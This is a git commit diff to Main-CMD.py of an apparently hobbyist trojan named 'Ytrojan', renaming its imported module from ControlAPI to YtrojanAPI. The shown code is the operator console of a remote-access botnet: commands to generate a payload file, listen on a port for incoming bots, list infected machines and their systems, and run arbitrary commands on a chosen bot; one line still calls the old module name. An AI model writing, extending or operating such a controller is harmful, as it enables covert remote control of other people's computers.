13550ff5bc29ea68d1bb3cc4bc13d8bae54c96f8
ycy <87306964+ycy20090311@users.noreply.github.com>
2022-12-02 20:33:37 +0800

    Update Main-CMD.py

--- src /Main-CMD.py
+++ src /Main-CMD.py
@@ -2,7 +2,7 @@
 # 2022.11.29
 
 import threading
-import ControlAPI
+import YtrojanAPI
 
 print("""
 \033[31m __   ___             _             \033[0m             
@@ -18,21 +18,21 @@ print("""
 while True:
     Command = input("Ytrojan $>")
     if Command.split()[0] == "generate":
-        Return = ControlAPI.Generate(Command.split()[1],Command.split()[2],Command.split()[3])
+        Return = YtrojanAPI.Generate(Command.split()[1],Command.split()[2],Command.split()[3])
         if Return != "no":
             print("\033[32m[INFO] The file is generated successfully \033[0m")
         else:
             print("\033[31m[ERROR] File generation failed \033[0m")
     
     elif Command.split()[0] == "listen":
-        threading.Thread(target=ControlAPI.Listen,args=(Command.split()[1],)).start()
+        threading.Thread(target=YtrojanAPI.Listen,args=(Command.split()[1],)).start()
         print("\033[32m[INFO] Open %s Port \033[0m" % Command.split()[1])
     
     elif Command.split()[0] == "botnet":
-        BotSockets = list(ControlAPI.BotNet.keys())
+        BotSockets = list(YtrojanAPI.BotNet.keys())
         print("\033[32m[INFO] Botint | system\033[0m")
-        for BotSocket in ControlAPI.BotNet:
-            print("%s  |  %s" % (BotSockets.index(BotSocket),ControlAPI.BotNet[BotSocket]))
+        for BotSocket in YtrojanAPI.BotNet:
+            print("%s  |  %s" % (BotSockets.index(BotSocket),YtrojanAPI.BotNet[BotSocket]))
     
     elif Command.split()[0] == "run":
         print(ControlAPI.Run(BotSockets[int(Command.split()[1])],Command.split(" ",2)[2]))
